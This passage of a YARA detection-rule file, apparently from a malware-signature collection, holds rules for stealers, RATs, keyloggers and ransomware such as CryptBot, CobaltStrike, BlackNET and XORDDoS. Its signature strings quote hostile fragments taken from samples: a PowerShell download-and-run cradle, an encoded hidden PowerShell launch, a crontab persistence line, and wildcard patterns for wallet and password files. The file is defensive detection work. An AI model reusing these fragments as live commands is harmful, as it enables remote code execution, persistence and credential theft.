meta:
author = "ditekSHen"
description = "IRCBot payload"
strings:
$s1 = ".okuninstall" fullword wide
$s2 = ".oksnapshot" fullword wide
$s3 = "\\uspread.vbs" fullword wide
$s4 = "KEYLogger" ascii nocase
$s5 = "GetKeyLogs" fullword ascii
$s6 = "GetLoocationInfo" fullword ascii
$s7 = "CaputerScreenshot" fullword ascii
$s8 = "get_SCRIPT_DATA" fullword ascii
$s9 = /irc_(server|nickname|password|channle)/ fullword ascii
$s10 = "machine_screenshot" fullword ascii
$s11 = "CollectPassword" fullword ascii
$s12 = "USBInfection" fullword ascii nocase
$cnc1 = "&command=UpdateAndGetTasks&machine_id=" wide
$cnc2 = "&machine_os=1&privateip=" wide
$cnc3 = "&command=InsertTaskExecution&excuter_id=" wide
$cnc4 = "&command=RegisterNewMachine" wide
$cnc5 = "&command=UpdateNewMachine" wide
$cnc6 = "&command=GetPayloads&keys=" wide
$cnc7 = "&command=SaveSnapshot" wide
$pdb = "\\Projects\\USBStarter\\USBStarter\\obj\\Release\\USBStarter.pdb" ascii
condition:
uint16(0) == 0x5a4d and (7 of ($s*) or 3 of ($cnc*) or ($pdb and 2 of them))
}
rule SSC_Win_Apocalypse {
meta:
author = "ditekSHen"
description = "Apocalypse infostealer payload"
strings:
$s1 = "OpenClipboard" fullword ascii
$s2 = "SendARP" fullword ascii
$s3 = "GetWebRequest" fullword ascii
$s4 = "DotNetGuard" fullword ascii
$s5 = "set_CreateNoWindow" fullword ascii
$s6 = "UploadFile" fullword ascii
$s7 = "GetHINSTANCE" fullword ascii
$s8 = "Kill" fullword ascii
$s9 = "GetProcesses" fullword ascii
$s10 = "get_PrimaryScreen" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_Osno {
meta:
author = "ditekSHen"
description = "Osno ransomware and infostealer payload"
strings:
$s1 = ".HolyGate+<>c+<<FinalBoss>" ascii
$s2 = /Osno(Keylogger|Stealer|Ransom)/ wide
$s3 = "password,executeWebhook('Account credentials" wide
$s4 = "-Name Osno -PropertyType" wide
$s5 = "process.env.hook" ascii
$s6 = "Stealer.JSON.JsonValue" ascii
$s7 = "<DetectBrowserss>b_" ascii
$s8 = "<TryGetDiscordPath>b_" ascii
$s9 = "antiVM" fullword ascii
$s10 = "downloadurl" fullword ascii
$s11 = "set_sPassword" fullword ascii
$txt0 = "{0} {1} .txt" fullword wide
$txt1 = "\\ScanningNetworks.txt" fullword wide
$txt2 = "\\SteamApps.txt" fullword wide
$txt3 = "-ErrorsLogs.txt" fullword wide
$txt4 = "-keylogs.txt" fullword wide
$txt5 = "Hardware & Soft.txt" fullword wide
$cnc0 = "/csharp/" ascii wide
$cnc1 = "token=" ascii wide
$cnc2 = "&timestamp=" ascii wide
$cnc3 = "&session_id=" ascii wide
$cnc4 = "&aid=" ascii wide
$cnc5 = "&secret=" ascii wide
$cnc6 = "&api_key" ascii wide
$cnc7 = "&session_key=" ascii wide
$cnc8 = "&type=" ascii wide
condition:
(uint16(0) == 0x5a4d and (6 of ($s*) or 4 of ($txt*) or (4 of ($s*) and 2 of ($txt*)))) or (7 of ($cnc*))
}
rule SSC_Win_BetaBot {
meta:
author = "ditekSHen"
description = "BetaBot payload"
strings:
$s1 = "__restart" fullword ascii
$s2 = "%SystemRoot%\\SysWOW64\\tapi3.dll" fullword wide
$s3 = "%SystemRoot%\\system32\\tapi3.dll" fullword wide
$s4 = "publicKeyToken=\"6595b64144ccf1df\"" ascii
$s5 = "VirtualProtectEx" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 600KB and  all of them
}
rule SSC_Win_WSHRAT {
meta:
author = "ditekSHen"
description = "WSHRAT keylogger plugin payload"
snort_sid = "920010-920012"
clamav_sig = "MALWARE.Win.Trojan.WSHRAT-KLG"
strings:
$s1 = "GET /open-keylogger HTTP/1.1" fullword wide
$s2 = "KeyboardChange: nCode={0}, wParam={1}, vkCode={2}, scanCode={3}, flags={4}, dwExtraInfo={6}" wide
$s3 = "MouseChange: nCode={0}, wParam={1}, x={2}, y={3}, mouseData={4}, flags={5}, dwExtraInfo={7}" wide
$s4 = "sendKeyLog" fullword ascii
$s5 = "saveKeyLog" fullword ascii
$s6 = "get_TotalKeyboardClick" fullword ascii
$s7 = "get_SessionMouseClick" fullword ascii
$pdb = "\\Android\\documents\\visual studio 2010\\Projects\\Keylogger\\Keylogger\\obj\\x86\\Debug\\Keylogger.pdb" ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 4 of them
}
rule SSC_Win_RevengeRAT {
meta:
author = "ditekSHen"
description = "RevengeRAT and variants payload"
snort_sid = "920000-920002"
strings:
$l1 = "Lime.Connection" fullword ascii
$l2 = "Lime.Packets" fullword ascii
$l3 = "Lime.Settings" fullword ascii
$l4 = "Lime.NativeMethods" fullword ascii
$s1 = "GetAV" fullword ascii
$s2 = "keepAlivePing!" fullword ascii wide
$s3 = "Revenge-RAT" fullword ascii wide
$s4 = "*-]NK[-*" fullword ascii wide
$s5 = "RV_MUTEX" fullword ascii wide
$s6 = "set_SendBufferSize" fullword ascii
$s7 = "03C7F4E8FB359AEC0EEF0814B66A704FC43FB3A8" fullword ascii
$s8 = "5B1EE7CAD3DFF220A95D1D6B91435D9E1520AC41" fullword ascii
$s9 = "\\RevengeRAT\\" ascii
$q1 = "Select * from AntiVirusProduct" fullword ascii wide
$q2 = "SELECT * FROM FirewallProduct" fullword ascii wide
$q3 = "select * from Win32_Processor" fullword ascii wide
condition:
uint16(0) == 0x5a4d and ((1 of ($l*) and 3 of ($s*)) or (all of ($q*) and 3 of ($s*)) or 3 of ($s*))
}
rule SSC_Win_TRAT {
meta:
author = "ditekSHen"
description = "TRAT payload"
clamav_sig = "MALWARE.Win.Trojan.TRAT"
strings:
$s1 = "^STEAM_0:[0-1]:([0-9]{1,10})$" fullword wide
$s2 = "^7656119([0-9]{10})$" fullword wide
$s3 = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)" ascii
$s4 = "\"schtasks\", \"/delete /tn UpdateWindows /f\");" ascii
$s5 = "ProcessWindowStyle.Hidden" ascii
$s6 = "+<>c+<<ListCommands>" ascii
$s7 = "//B //Nologo *Y" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_CryptBot {
meta:
author = "ditekSHen"
description = "CryptBot/Fugrafa stealer payload"
snort2_sid = "920110"
snort3_sid = "920108"
clamav_sig = "MALWARE.Win.Trojan.CryptBot"
strings:
$s1 = "Username: %wS" fullword wide
$s2 = "Computername: %wS" fullword wide
$s3 = "/c rd /s /q %" wide
$s4 = "IP: N0t_IP" fullword wide
$s5 = "Country: N0t_Country" fullword wide
$s6 = "password-check" fullword ascii
$s7 = "Content-Disposition: form-data; name=\"file\"; filename=\"" ascii wide
$s8 = "[ %wS ]" wide
$s9 = "EXE_PATH:" wide
$s10 = "Username (Computername):" wide
$s11 = "Operating system language:" wide
$s12 = "/index.php" wide
$f1 = "*ledger*.txt" fullword wide
$f2 = "*crypto*.xlsx" fullword wide
$f3 = "*private*.txt" fullword wide
$f4 = "*wallet*.dat" fullword wide
$f5 = "*pass*.txt" fullword wide
$f6 = "*bitcoin*.txt" fullword wide
$p1 = "%USERPROFILE%\\Desktop\\*.txt" fullword wide
$p2 = "%USERPROFILE%\\Desktop\\secret.txt" fullword wide
$p3 = "%USERPROFILE%\\Desktop\\report.doc" fullword wide
$pattern1 = /(files_|_Files)\\(_?)(cookies|cryptocurrency|forms|passwords|system_info|screenshot|screen_desktop|information|files|wallet|cc|Coinomi)\\?(\.txt|\.jpg|\.jpeg)?/ ascii wide nocase
$pattern2 = /%(s|ws)\\%(s|ws)\\(Login Data|Cookies|Web Data)/ fullword wide
$pattern3 = /(_AllPasswords_list.txt|_AllForms_list.txt|_AllCookies_list.txt|_All_CC_list.txt|_Information.txt|_Info.txt|_Screen_Desktop.jpeg)/ fullword wide
condition:
uint16(0) == 0x5a4d and ((5 of ($s*) and 1 of ($p*)) or (4 of ($s*) and 1 of ($f*) and 1 of ($p*)) or (2 of ($pattern*) and 3 of ($s*)) or (#pattern1 > 6 and (2 of ($s*) or 1 of ($p*))))
}
rule SSC_Win_Matiex {
meta:
author = "ditekSHen"
description = "Matiex/XetimaLogger keylogger payload"
clamav_sig = "MALWARE.Win.Trojan.MatiexKeylogger"
strings:
$id = "--M-A-T-I-E-X--K-E-Y-L-O-G-E-R--" ascii wide
$s1 = "StartKeylogger" fullword ascii
$s2 = "_KeyboardLoggerTimer" ascii
$s3 = "_ScreenshotLoggerTimer" ascii
$s4 = "_VoiceRecordLogger" ascii
$s5 = "_ClipboardLoggerTimer" ascii
$s6 = "get_logins" fullword ascii
$s7 = "get_processhackerFucked" fullword ascii
$s8 = "_ThePSWDSenders" fullword ascii
$pdb = "\\Before FprmT\\Document VB project\\FireFox Stub\\FireFox Stub\\obj\\Debug\\VNXT.pdb" ascii
condition:
uint16(0) == 0x5a4d and ($id or 4 of ($s*) or ($pdb and 2 of them))
}
rule SSC_Win_IAmTheKingKeylogger {
meta:
author = "ditekSHen"
description = "IAmTheKing Keylogger payload"
clamav_sig = "MALWARE.Win.Trojan.IAmTheKingKeylogger"
strings:
$s1 = "[TIME:]%d/%d/%d %02d:%02d:%02d" fullword ascii
$s2 = "[TITLE:]" fullword ascii
$s3 = "%s-%02d-%02d-%02d-%02d" fullword ascii
$s4 = "[DATA]:" fullword ascii
$s5 = "[BK]" fullword ascii
$s6 = "Log.txt" fullword ascii
$s7 = "sonme hting is wrong x" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_IAmTheKingScrCap {
meta:
author = "ditekSHen"
description = "IAmTheKing screen capture payload"
strings:
$s1 = "@MyScreen.jpg" fullword wide
$s2 = "DISPLAY" fullword wide
$s3 = ".?AVCImage@ATL@@" fullword ascii
$s4 = ".?AVGdiplusBase@Gdiplus@@" fullword ascii
$s5 = ".?AVImage@Gdiplus@@" fullword ascii
$s6 = ".?AVBitmap@Gdiplus@@" fullword ascii
$s7 = ".?AVCAtlException@ATL@@" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_IAmTheKingKingOfHearts {
meta:
author = "ditekSHen"
description = "IAmTheKing King Of Hearts payload"
strings:
$s1 = "write info fail!!! GetLastError-->%u" fullword ascii
$s2 = "LookupAccountSid Error %u" fullword ascii
$s3 = "CreateServiceErrorID:%d" fullword ascii
$s4 = "In ControlServiceErrorID:%d" fullword ascii
$s5 = "In QueryServiceStatus ErrorID:%d" fullword ascii
$s6 = "Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"" fullword ascii
$s7 = "hello%s" fullword ascii
$s8 = "additional header failed..." fullword ascii
$s9 = "Set Option failed errcode: %ld" fullword ascii
$s10 = "add cookie failed..." fullword ascii
$u1 = "Mozilla/4.0 (compatible; )" fullword ascii
$u2 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SE)" fullword ascii
condition:
uint16(0) == 0x5a4d and ((1 of ($u*) and 4 of ($s*)) or (all of ($u*) and 3 of ($s*)) or (5 of them))
}
rule SSC_Win_CobaltStrike {
meta:
author = "ditekSHen"
description = "CobaltStrike payload"
strings:
$s1 = "%%IMPORT%%" fullword ascii
$s2 = "www6.%x%x.%s" fullword ascii
$s3 = "cdn.%x%x.%s" fullword ascii
$s4 = "api.%x%x.%s" fullword ascii
$s5 = "%s (admin)" fullword ascii
$s6 = "could not spawn %s: %d" fullword ascii
$s7 = "Could not kill %d: %d" fullword ascii
$s8 = "Could not connect to pipe (%s): %d" fullword ascii
$s9 = /%s\.\d[(%08x).]+\.%x%x\.%s/ ascii
$pwsh1 = "IEX (New-Object Net.Webclient).DownloadString('http" ascii
$pwsh2 = "powershell -nop -exec bypass -EncodedCommand \"%s\"" fullword ascii
condition:
uint16(0) == 0x5a4d and (5 of ($s*) or (all of ($pwsh*) and 2 of ($s*)) or (#s9 > 6 and 4 of them))
}
rule SSC_Win_RedLineDropperAHK {
meta:
author = "ditekSHen"
description = "Detects AutoIt/AutoHotKey executables dropping RedLine infostealer"
clamav_sig = "MALWARE.Win.Trojan.RedLineDropper-AHK"
strings:
$s1 = ".SetRequestHeader(\"User-Agent\",\" ( \" OSName \" | \" bit \" | \" CPUNAme \"\"" ascii
$s2 = ":= \" | Windows Defender\"" ascii
$s3 = "WindowSpy.ahk" wide
$s4 = ">AUTOHOTKEY SCRIPT<" fullword wide
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_DLAgent01 {
meta:
author = "ditekSHen"
description = "Detects known downloader agent"
snort_sid = "920007"
clamav_sig = "MALWARE.Win.Trojan.DLAgent01"
strings:
$s1 = "Mozilla/5.0 Gecko/41.0 Firefox/41.0" fullword wide
$s2 = "/Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List" fullword wide
$s3 = "GUID.log" fullword wide
$s4 = "NO AV" fullword wide
$s5 = "%d:%I64d:%I64d:%I64d" fullword wide
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Linux_PLEAD {
meta:
author = "ditekSHen"
description = "PLEAD Linux payload"
clamav_sig = "MALWARE.Linux.Trojan.PLEAD"
strings:
$x1 = "CFileTransfer" ascii
$x2 = "CFileManager" ascii
$x3 = "CPortForward" ascii
$x4 = "CPortForwardManager" ascii
$x5 = "CRemoteShell" ascii
$x6 = "CSockClient" ascii
$s1 = "/proc/self/exe" fullword ascii
$s2 = "/bin/sh" fullword ascii
$s3 = "echo -e '" ascii
$s4 = "%s    <DIR>    %s" ascii
$s5 = "%s    %lld    %s" ascii
$s6 = "Files: %d        Size: %lld" ascii
$s7 = "Dirs: %d" ascii
$s8 = "%s(%s)/" ascii
$s9 = "%s %s %s %s" ascii
condition:
uint16(0) == 0x457f and (all of ($x*) or all of ($s*) or 12 of them)
}
rule SSC_Win_CRATPluginKeylogger {
meta:
author = "ditekSHen"
description = "Detects CRAT keylogger plugin DLL"
clamav_sig = "MALWARE.Win.Trojan.CRAT"
strings:
$ai1 = "VM detected!" fullword wide
$ai2 = "Sandbox detected!" fullword wide
$ai3 = "Debug detected!" fullword wide
$ai4 = "Analysis process detected!" fullword wide
$s1 = "Create KeyLogMutex %s failure %d" wide
$s2 = "Key Log Mutex already created! %s" wide
$s3 = /KeyLogThread\s(started|finished|terminated)!/ wide
$s4 = /KeyLog_(x64|x32|Win64|Win32)_DllRelease\.dll/ fullword ascii
condition:
uint16(0) == 0x5a4d and ((all of ($ai*) and 1 of ($s*)) or (3 of ($s*) and 1 of ($ai*)) or 5 of them)
}
rule SSC_Win_CRATPluginClipboardMonitor {
meta:
author = "ditekSHen"
description = "Detects CRAT Clipboad Monitor plugin DLL"
strings:
$ai1 = "VM detected!" fullword wide
$ai2 = "Sandbox detected!" fullword wide
$ai3 = "Debug detected!" fullword wide
$ai4 = "Analysis process detected!" fullword wide
$s1 = "Clipboard Monitor Mutex [%s] already created!" wide
$s2 = "ClipboardMonitorThread started!" fullword wide
$s3 = /MonitorClipboardThread\s(finished|terminated)!/ wide
$s4 = /ClipboardMonitor_(x64|x32|Win64|Win32)_DllRelease\.dll/ fullword ascii
condition:
uint16(0) == 0x5a4d and ((all of ($ai*) and 1 of ($s*)) or (3 of ($s*) and 1 of ($ai*)) or 5 of them)
}
rule SSC_Win_CRATPluginScreenCapture {
meta:
author = "ditekSHen"
description = "Detects CRAT Screen Capture plugin DLL"
strings:
$ai1 = "VM detected!" fullword wide
$ai2 = "Sandbox detected!" fullword wide
$ai3 = "Debug detected!" fullword wide
$ai4 = "Analysis process detected!" fullword wide
$s1 = "User is inactive!, give up capture" wide
$s2 = "Capturing screen..." wide
$s3 = "%s\\P%02d%lu.tmp" fullword wide
$s4 = "CloseHandle ScreenCaptureMutex failure! %d" fullword wide
$s5 = "ScreenCaptureMutex already created! %s" fullword wide
$s6 = "Create ScreenCaptureMutex %s failure %d" fullword wide
$s7 = /ScreenCaptureThread\s(finished|terminated)!/ wide
$s8 = /ScreenCapture_(x64|x32|Win64|Win32)_DllRelease\.dll/ fullword ascii
condition:
uint16(0) == 0x5a4d and ((all of ($ai*) and 1 of ($s*)) or (3 of ($s*) and 1 of ($ai*)) or 6 of them)
}
rule SSC_Win_CRATPluginRansomHansom {
meta:
author = "ditekSHen"
description = "Detects CRAT Hansom Ransomware plugin DLL"
strings:
$cmd1 = "/f /im \"%s\"" wide
$cmd2 = "add HKLM\\%s /v %s /t REG_DWORD /d %d /F" wide
$cmd3 = "add HKCU\\%s /v %s /t REG_DWORD /d %d /F" wide
$cmd4 = "\"%s\" a -y -ep -k -r -s -ibck -df -m0 -hp%s -ri1:%d \"%s\" \"%s\"" wide
$s1 = "\\hansom.jpg" wide
$s2 = "HansomMain" fullword ascii wide
$s3 = "ExtractHansom" fullword ascii wide
$s4 = "Hansom2008" fullword ascii
$s5 = ".hansomkey" fullword wide
$s6 = ".hansom" fullword wide
$s7 = /Ransom_(x64|x32|Win64|Win32)_DllRelease\.dll/ fullword ascii
condition:
uint16(0) == 0x5a4d and ((2 of ($cmd*) and 2 of ($s*)) or (4 of ($s*) and 1 of ($cmd*)) or 6 of them)
}
rule SSC_Win_AlienCrypter {
meta:
author = "ditekSHen"
description = "Detects AlienCrypter injector/downloader/obfuscator"
strings:
$s1 = ".AlienRunPE." ascii wide
$s2 = "RunAsNewUser_RunDLL" fullword wide
$s3 = { 00 50 52 4f 43 45 53 53 5f 53 55 53 50 45 4e 44 5f 52 45 53 55 4d 45 00 64 6e 6c 69 62 2e 50 45 00 }
$s4 = { 2e 41 6c 69 65 6e 52 75 6e 50 45 00 50 52 4f 43 45 53 53 5f 54 45 52 4d 49 4e 41 54 45 00 }
$s5 = "@@@http" wide
$resp1 = "</p><p>@@@77,90," ascii wide
$resp2 = "</p><p>@@@HH,JA," ascii wide
condition:
(uint16(0) == 0x5a4d and 3 of them) or (1 of ($resp*) and 2 of ($s*))
}
rule SSC_Win_Ficker {
meta:
author = "ditekSHen"
description = "Detects Ficker infostealer"
clamav_sig = "MALWARE.Win.Trojan.Ficker"
strings:
$s1 = "JNOde\\" ascii
$s2 = "\"SomeNone" fullword ascii
$s3 = "kindmessage" fullword ascii
$s4 = "..\\\\?\\.\\UNC\\Windows stdio in console mode does not support writting non-UTF-8 byte sequences" ascii
$s5 = "..\\\\?\\.\\UNC\\Windows stdio in console mode does not support writing non-UTF-8 byte sequences" ascii
$s6 = "(os error other os erroroperation interrruptedwrite zerotimed" ascii
$s7 = "(os error other os erroroperation interruptedwrite zerotimed" ascii
$s8 = "nPipeAlreadyExistsWouldBlockInvalidInputInvalidDataTimedOutWriteZeroInterruptedOtherN" fullword ascii
$s9 = "_matherr(): %s in %s(%g, %g)  (retval=%g)" ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_Xorist {
meta:
author = "ditekSHen"
description = "Detects Xorist ransomware"
clamav_sig = "MALWARE.Win.Ransomware.Xorist"
strings:
$x1 = { 00 4d 00 41 00 47 00 45 00 0b 00 50 00 55 00
53 00 53 00 59 00 4c 00 49 00 43 00 4b 00 45
00 52 00 }
$x2 = { 30 70 33 6e 53 4f 75 72 63 33 20 58 30 72 31 35
37 2c 20 6d 6f 74 68 65 72 66 75 63 6b 65 72 21
00 70 75 73 73 79 6c 69 63 6b 65 72 00 2e 62 6d
70 00 2e 00 2e 2e 00 6f 70 65 6e 00 2e 65 78 65 }
$s1 = "\\shell\\open\\command" fullword ascii
$s2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" fullword ascii
$s3 = "CRYPTED!" fullword ascii
$s4 = "Attention!" fullword ascii
$s5 = "Password:" fullword ascii
$s6 = { 43 6f 6d 53 70 65 63 00 2f 63 20 64 65 6c 20 22 00 22 20 3e 3e 20 4e 55 4c }
condition:
uint16(0) == 0x5a4d and (all of ($x*) or 5 of ($s*) or (1 of ($x*) and 3 of ($s*)))
}
rule SSC_Win_PYSA {
meta:
author = "ditekSHen"
description = "Detects PYSA/Mespinoza ransomware"
clamav_sig = "MALWARE.Win.Ransomware.PYSA"
strings:
$s1 = "%s\\Readme.README" fullword wide
$s2 = "Every byte on any types of your devices was encrypted" ascii
$s3 = { 6c 65 67 61 6c 6e 6f 74 69 63 65 74 65 78 74 00 (50|70) (59|79) (53|73) (41|61) }
$s4 = { 6c 65 67 61 6c 6e 6f 74 69 63 65 63 61 70 74 69 6f 6e 00 00 (50|70) (59|79) (53|73) (41|61) }
$s5 = { 2e 62 61 74 00 00 6f 70 65 6e 00 00 00 00 53
4f 46 54 57 41 52 45 5c 4d 69 63 72 6f 73 6f
66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72 72
65 6e 74 56 65 72 73 69 6f 6e 5c 50 6f 6c 69
63 69 65 73 5c 53 79 73 74 65 6d 00 00 00 }
$f1 = ".?AVPK_EncryptorFilter@CryptoPP@@" ascii
$f2 = ".?AV?$TF_EncryptorImpl@" ascii
$f3 = "@VTF_EncryptorBase@CryptoPP@@" ascii
condition:
uint16(0) == 0x5a4d and all of ($f*) and 3 of ($s*)
}
rule SSC_Win_Polar {
meta:
author = "ditekSHen"
description = "Detects Polar ransomware"
clamav_sig = "MALWARE.Win.Ransomware.Polar"
strings:
$s1 = "Encrypt Failed ! ErrorMessage :" wide
$s2 = ".locked" fullword wide
$s3 = ".cryptd" fullword wide
$s4 = "$SysReset" fullword wide
$s5 = "Polar.Properties.Resources" ascii wide
$s6 = "AES_EnDecryptor.Basement" fullword ascii
$s7 = "RunCMDCommand" fullword ascii
$s8 = "killerps_list" fullword ascii
$s9 = "clearlog" fullword ascii
$s10 = "encryptFile" fullword ascii
$s11 = "changeBackPictrue" fullword ascii
$pdb1 = "\\Ransomware_ALL_encode\\dir_file\\obj\\x86\\Release\\Encode.pdb" ascii
$pdb2 = "\\Ransomware_ALL_encode\\dir_file\\obj\\x64\\Release\\Encode.pdb" ascii
condition:
uint16(0) == 0x5a4d and (8 of ($s*) or (1 of ($pdb*) and 2 of ($s*)))
}
rule SSC_Win_BitRAT {
meta:
author = "ditekSHen"
description = "Detects BitRAT RAT"
clamav_sig = "MALWARE.Win.Trojan.BitRAT"
strings:
$s1 = "\\plg\\" fullword ascii
$s2 = "klgoff_del" fullword ascii
$s3 = "files_delete" ascii
$s4 = "files_zip_start" fullword ascii
$s5 = "files_exec" fullword ascii
$s6 = "drives_get" fullword ascii
$s7 = "srv_list" fullword ascii
$s8 = "con_list" fullword ascii
$s9 = "ddos_stop" fullword ascii
$s10 = "socks5_srv_start" fullword ascii
$s11 = "/getUpdates?offset=" fullword ascii
$s12 = "Action: /dlex" fullword ascii
$s13 = "Action: /clsbrw" fullword ascii
$s14 = "Action: /usb" fullword ascii
$s15 = "/klg" fullword ascii
$s16 = "klg|" fullword ascii
$s17 = "Slowloris" fullword ascii
$s18 = "Bot ID:" ascii
$t1 = "<sz>N/A</sz>" fullword ascii
$t2 = "<silent>N/A</silent>" fullword ascii
condition:
uint16(0) == 0x5a4d and (7 of ($s*) or (4 of ($s*) and 1 of ($t*)))
}
rule SSC_Win_Poullight {
meta:
author = "ditekSHen"
description = "Detects Poullight infostealer"
snort2_sid = "920074-920075"
snort3_sid = "920074-920075"
clamav_sig = "MALWARE.Win.Trojan.Poullight"
strings:
$s1 = "zipx" fullword wide
$s2 = "{0}Windows Defender.exe" fullword wide
$s3 = "pll_test" fullword wide
$s4 = "loginusers.vdf" wide
$s5 = "Stealer by Nixscare" wide
$s6 = "path_lad" fullword ascii
$s7 = "<CheckVM>" ascii
$s8 = "Poullight.Properties" ascii
$s9 = "</ulfile>" fullword wide
$s10 = "{0}processlist.txt" fullword wide
$s11 = "{0}Browsers\\Passwords.txt" fullword wide
condition:
uint16(0) == 0x5a4d and 7 of them
}
rule SSC_Win_SnakeKeylogger {
meta:
author = "ditekSHen"
description = "Detects Snake Keylogger"
clamav_sig = "MALWARE.Win.Trojan.SnakeKeylogger"
strings:
$id1 = "SNAKE-KEYLOGGER" fullword ascii
$id2 = "----------------S--------N--------A--------K--------E----------------" ascii
$s1 = "_KPPlogS" fullword ascii
$s2 = "_Scrlogtimerrr" fullword ascii
$s3 = "_Clpreptimerr" fullword ascii
$s4 = "_clprEPs" fullword ascii
$s5 = "_kLLTIm" fullword ascii
$s6 = "_TPSSends" fullword ascii
$s7 = "_ProHfutimer" fullword ascii
$s8 = "GrabbedClp" fullword ascii
$s9 = "StartKeylogger" fullword ascii
// Snake Keylogger Stub New
$x1 = "$%SMTPDV$" wide
$x2 = "$#TheHashHere%&" wide
$x3 = "%FTPDV$" wide
$x4 = "$%TelegramDv$" wide
$x5 = "KeyLoggerEventArgs" ascii
$m1 = "| Snake Keylogger" ascii wide
$m2 = /(Screenshot|Clipboard|keystroke) Logs ID/ ascii wide
$m3 = "SnakePW" ascii wide
$m4 = "\\SnakeKeylogger\\" ascii wide
condition:
(uint16(0) == 0x5a4d and (all of ($id*) or 6 of ($s*) or (1 of ($id*) and 3 of ($s*)) or 4 of ($x*))) or (2 of ($m*))
}
rule SSC_Linux_XORDDoS {
meta:
author = "ditekSHen"
description = "Detects XORDDoS"
strings:
$s1 = "for i in `cat /proc/net/dev|grep :|awk -F: {'print $1'}`; do ifconfig $i up& done" fullword ascii
$s2 = "cp /lib/libudev.so /lib/libudev.so.6" fullword ascii
$s3 = "sed -i '/\\/etc\\/cron.hourly\\/gcc.sh/d' /etc/crontab && echo '*/3 * * * * root /etc/cron.hourly/gcc.sh' >> /etc/crontab" fullword ascii
$s4 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR 1.1.4322)" fullword ascii
condition:
uint32(0) == 0x464c457f and 3 of them
}
rule SSC_Win_BlackNET {
meta:
author = "ditekSHen"
description = "Detects BlackNET RAT"
snort2_sid = "920079-920082"
snort3_sid = "920079-920082"
clamav_sig = "MALWARE.Win.Trojan.BlackNET"
strings:
$s1 = "SbieCtrl" fullword wide
$s2 = "SpyTheSpy" fullword wide
$s3 = "\\BlackNET.dat" fullword wide
$s4 = "StartDDOS" fullword wide
$s5 = "UDPAttack" fullword wide
$s6 = "ARMEAttack" fullword wide
$s7 = "TCPAttack" fullword wide
$s8 = "HTTPGetAttack" fullword wide
$s9 = "RetriveLogs" fullword wide
$s10 = "StealPassword" fullword wide
$s11 = "/create /f /sc ONSTART /RL HIGHEST /tn \"'" fullword wide
$b1 = "DeleteScript|BN|" fullword wide
$b2 = "|BN|Online" fullword wide
$b3 = "NewLog|BN|" fullword wide
$cnc1 = "/getCommand.php?id=" fullword wide
$cnc2 = "/upload.php?id=" fullword wide
$cnc3 = "connection.php?data=" fullword wide
$cnc4 = "/receive.php?command=" fullword wide
condition:
uint16(0) == 0x5a4d and (9 of ($s*) or all of ($cnc*) or all of ($b*) or 12 of them)
}
rule SSC_Win_Bulz01 {
meta:
author = "ditekSHen"
description = "Detects trojan loader"
strings:
$s1 = "DisableTrivet.dll" fullword ascii
condition:
uint16(0) == 0x5a4d and pe.is_dll() and all of ($s*) and (
pe.exports("Ordinal") or pe.exports("Chechako") or pe.exports("Originator") or pe.exports("Repressions")
)
}
rule SSC_Win_RevCodeRAT {
meta:
author = "ditekSHen"
description = "Detects RevCode/WebMonitor RAT"
snort2_sid = "920070"
snort3_sid = "920070"
clamav_sig = "MALWARE.Win.Trojan.RevCodeRAT"
strings:
$x1 = "rev-novm.dat" fullword wide
$x2 = "WebMonitor-" fullword wide
$x3 = "WebMonitor Client" fullword wide
$x4 = "Launch WebMonitor" fullword wide
$s1 = "KEYLOG_DEL" fullword ascii
$s2 = "KEYLOG_STREAM_START" fullword ascii
$s3 = "send_keylog_del" fullword ascii
$s4 = "send_keylog_stream_" ascii
$s5 = "send_shell_exec" fullword ascii
$s6 = "send_file_download_exec" fullword ascii
$s7 = "send_pdg_exec" fullword ascii
$s8 = "send_app_cmd_upd" fullword ascii
$s9 = "send_webcamstream_start" fullword ascii
$s10 = "send_screenstream_start" fullword ascii
$s11 = "send_clipboard_get" fullword ascii
$s12 = "send_pdg_rev_proxy_stop" fullword ascii
$s13 = "send_shell_stop" fullword ascii
$s14 = "send_wnd_cmd" fullword ascii
$s15 = "SCREEN_STREAM_LEGACY(): Started..." fullword ascii
$s16 = "SYSTEM_INFORMATION(): Failed! (Error:" fullword ascii
$s17 = "TARGET_HOST_UPDATE(): Sync successful!" fullword ascii
$s18 = "PLUGIN_PROCESS_REVERSE_PROXY: Plugin" ascii
$s19 = "PLUGIN_PROCESS: Plugin" ascii
$s20 = "PLUGIN_EXEC: Plugin" ascii
$s21 = "PLUGIN_PROCESS_SCREEN_STREAM: Plugin" ascii
$cnc1 = "?task_id=" fullword ascii
$cnc2 = "&operation=" fullword ascii
$cnc3 = "&filesize=" fullword ascii
$cnc4 = "pos=" fullword ascii
$cnc5 = "&mode=" fullword ascii
$cnc6 = "&cmp=1" fullword ascii
$cnc7 = "&cmp=0" fullword ascii
$cnc8 = "&enc=1" fullword ascii
$cnc9 = "&enc=0" fullword ascii
$cnc10 = "&user=" fullword ascii
$cnc11 = "&uid=" fullword ascii
$cnc12 = "&key=" fullword ascii
condition:
uint16(0) == 0x5a4d and (3 of ($x*) or all of ($cnc*) or 8 of ($s*) or (1 of ($x*) and 6 of ($s*)) or (6 of ($cnc*) and 6 of ($s*)))
}
rule SSC_Win_PowerPool_STG1 {
meta:
author = "ditekSHen"
description = "Detects first stage PowerPool backdoor"
snort2_sid = "920088"
snort3_sid = "920086"
clamav_sig = "MALWARE.Win.Trojan.PowerPool-STG-1"
strings:
$s1 = "cmd /c powershell.exe $PSVersionTable.PSVersion > \"%s\"" fullword wide
